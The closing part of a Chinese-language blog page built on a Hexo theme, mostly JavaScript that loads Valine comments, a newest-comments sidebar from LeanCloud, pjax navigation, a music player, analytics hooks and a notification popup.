    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>